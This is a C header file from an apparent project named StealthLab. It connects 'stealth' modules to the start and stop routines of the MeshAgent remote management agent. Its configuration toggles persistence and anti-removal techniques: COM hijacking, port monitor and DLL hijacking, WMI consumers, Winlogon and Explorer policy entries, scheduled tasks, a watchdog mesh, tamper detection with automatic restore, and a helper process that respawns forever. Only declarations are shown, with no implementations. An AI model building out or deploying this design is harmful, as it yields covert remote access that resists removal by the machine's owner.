/*
 * stealth_integration.h - Main integration layer for StealthLab components
 *
 * Connects all stealth modules to MeshAgent service lifecycle:
 * - stealth_lockdown: SecureEnter/SecureExit orchestration
 * - stealth_monitor: Continuous monitoring thread
 * - stealth_state: State persistence and restoration
 * - stealth_watchdog: Process watchdog mesh
 * - stealth_ipc: Named pipe IPC server
 * - stealth_persistence: COM hijacking, port monitor, etc.
 * - stealth_registry: Registry operations
 * - stealth_resilience: Task scheduler and WMI
 *
 * This module should be called from MeshAgent_Start() and MeshAgent_Stop().
 */

#ifndef STEALTH_INTEGRATION_H
#define STEALTH_INTEGRATION_H

#include <windows.h>

#ifdef __cplusplus
extern "C" {
#endif

/* Integration configuration - loaded from branding or config file */
typedef struct StealthIntegrationConfig {
    /* Feature toggles from branding */
    BOOL enableServiceProtection;
    BOOL enableWatchdog;
    BOOL enableTaskScheduler;
    BOOL enableWmiConsumer;
    BOOL enableRegistryPolicy;
    BOOL enableWinlogon;
    BOOL enableExplorerPolicy;
    BOOL enableComHijack;
    BOOL enablePortMonitor;
    BOOL enableDllHijack;
    BOOL enableTamperDetection;
    BOOL enableIpcServer;
    BOOL enableHelperMonitor;    /* Enable user-session helper process monitoring */

    /* Timing configuration */
    DWORD monitorIntervalMs;     /* Default: 8000 */
    DWORD watchdogIntervalMs;    /* Default: 5000 */
    DWORD ipcTimeoutMs;          /* Default: 30000 */

    /* Paths */
    WCHAR serviceName[64];
    WCHAR displayName[128];
    WCHAR serviceExePath[MAX_PATH];
    WCHAR installDir[MAX_PATH];
    WCHAR stateFilePath[MAX_PATH];
    WCHAR logFilePath[MAX_PATH];

    /* IPC configuration */
    WCHAR ipcPipeName[128];
    WCHAR ipcAuthKey[64];

    /* Helper process configuration */
    WCHAR helperExePath[MAX_PATH];   /* Path to helper executable */
    WCHAR helperArguments[256];      /* Command line arguments for helper */
    BOOL helperPersistentSpawn;      /* Keep retrying spawn forever */
    BOOL helperRegisterWatchdog;     /* Register helper with main watchdog */

    /* Auto-lockdown on start */
    BOOL autoSecureEnter;
} StealthIntegrationConfig;

/* Integration status */
typedef struct StealthIntegrationStatus {
    BOOL initialized;
    BOOL lockdownActive;
    BOOL monitorRunning;
    BOOL watchdogRunning;
    BOOL ipcServerRunning;
    BOOL helperMonitorRunning;
    DWORD activeFeatures;
    DWORD tamperEvents;
    DWORD restoreAttempts;
    LONGLONG uptimeMs;
    WCHAR lastError[256];
} StealthIntegrationStatus;

/*
 * Initialize all stealth components
 * Call this early in MeshAgent_Start() after service registration
 */
BOOL StealthIntegration_Init(const StealthIntegrationConfig* config);

/*
 * Start all configured stealth components
 * Call this after MeshAgent_Start() completes initialization
 */
BOOL StealthIntegration_Start(void);

/*
 * Stop all stealth components gracefully
 * Call this at the beginning of MeshAgent_Stop()
 */
void StealthIntegration_Stop(void);

/*
 * Cleanup and free all resources
 * Call this at the end of MeshAgent_Stop() or on uninstall
 */
void StealthIntegration_Cleanup(void);

/*
 * Get current integration status
 */
void StealthIntegration_GetStatus(StealthIntegrationStatus* status);

/*
 * Trigger SecureEnter programmatically
 * Returns TRUE if lockdown activated successfully
 */
BOOL StealthIntegration_SecureEnter(void);

/*
 * Trigger SecureExit programmatically
 * Returns TRUE if lockdown deactivated successfully
 */
BOOL StealthIntegration_SecureExit(void);

/*
 * Check if lockdown is currently active
 */
BOOL StealthIntegration_IsLockdownActive(void);

/*
 * Handle service control events (called from service control handler)
 * Returns TRUE if event was handled
 */
BOOL StealthIntegration_HandleServiceControl(DWORD controlCode);

/*
 * Handle session change events (called from service control handler)
 * eventType: WTS_CONSOLE_CONNECT, WTS_SESSION_LOGON, etc.
 * sessionId: The session that changed
 */
void StealthIntegration_HandleSessionChange(DWORD eventType, DWORD sessionId);

/*
 * Update configuration at runtime
 * Some changes require restart to take effect
 */
BOOL StealthIntegration_UpdateConfig(const StealthIntegrationConfig* config);

/*
 * Force re-check and restore any tampered items
 */
DWORD StealthIntegration_CheckAndRestore(void);

/*
 * Emergency shutdown - disable everything without cleanup
 * Use only during critical errors or forced uninstall
 */
void StealthIntegration_EmergencyShutdown(void);

/*
 * Load configuration from branding/provisioning
 * Returns default config if loading fails
 */
void StealthIntegration_LoadDefaultConfig(StealthIntegrationConfig* config);

#ifdef __cplusplus
}
#endif

#endif /* STEALTH_INTEGRATION_H */
